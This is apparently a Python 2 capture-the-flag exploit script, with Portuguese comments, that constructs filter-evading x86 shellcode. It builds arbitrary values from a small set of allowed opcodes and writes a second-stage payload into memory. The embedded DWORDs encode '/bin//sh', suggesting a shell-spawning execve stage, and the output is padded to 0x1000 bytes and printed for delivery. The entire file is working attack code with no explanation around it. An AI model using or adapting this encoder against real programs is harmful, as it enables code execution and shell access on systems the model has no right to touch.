ZERAR_EAX = "\x25\x02\x02\x02\x02\x0d\x02\x02\x02\x02\x35\x02\x02\x02\x02"
MOV_ECX_EAX = "\x89\xC1"
MOV_EBP_EAX = "\x89\xC5"
MOV_EDI_EAX = "\x89\xC7"
SUB_EDI_EBP = "\x29\xEF"
MOV_EBX_EDI = "\x89\xfb"
MOV_EDI_EBX = "\x8b\xfb"

MOV_EAX_EDI = "\x8B\xc7"

MOV_EBX_EAX = MOV_EDI_EAX + MOV_EBX_EDI
MOV_EAX_EBX = "\x8b\xfb\x8b\xc7"

MOV_EDX_EBX = "\x8b\xd3"
MOV_EBX_EDX = "\x89\xd3"

MOV_MEM_RBX_EAX = "\x89\x03"


MOV_EDI_3 = ZERAR_EAX + MOV_EDI_EAX + "\x83\xc7\x03"
MOV_EBP_2 = ZERAR_EAX + MOV_EBP_EAX + "\x83\xc5\x02"
MOV_EAX_1 = MOV_EDI_3 + MOV_EBP_2 +  SUB_EDI_EBP + MOV_EAX_EDI

OR_EAX_EDI = "\x0b\xc7"
MUL_EDI_2 = MOV_EBX_EDI + "\x6b\xfb\x02"

def MUL_EDI_BY(number):
    return "\x6b\xc7" + chr(number)

def ADD_EBX_BY(number):
    return MOV_EDI_EBX + "\x83\xc7" + chr(number) + MOV_EBX_EDI

def MOV_EAX_DWORD(DWORD):
    res = ""
    res+= MOV_EAX_1
    res+= MOV_EDI_EAX
    res+= ZERAR_EAX
    for i in range(32):
        if ((1<<i) & DWORD) == 1<<i:
            res+= OR_EAX_EDI
        res+= MUL_EDI_2
    return res


primecode = ""

# Move 0x1337000 para EBX
primecode += MOV_EBX_EAX

# Somar o tamanho do primecode a ebx. , pois ebx eh o index de escrita do shellcode.
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)

primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)

primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)

primecode += ADD_EBX_BY(101)
primecode += ADD_EBX_BY(101)

primecode += ADD_EBX_BY(53)


dword_code = [3142121009, 1852400175, 1752379183, 1599361878, 827865962, 2416250834]

for dword in dword_code:
    primecode += MOV_EDX_EBX
    primecode += MOV_EAX_DWORD(dword)
    primecode += MOV_EBX_EDX
    primecode += MOV_MEM_RBX_EAX
    primecode += ADD_EBX_BY(2)
    primecode += ADD_EBX_BY(2)


primecode += MOV_EDI_EAX

primecode += "\x83\xc7\x03"



#print len(primecode)

primecode = primecode + "5"*(0x1000-len(primecode))

print primecode ,






















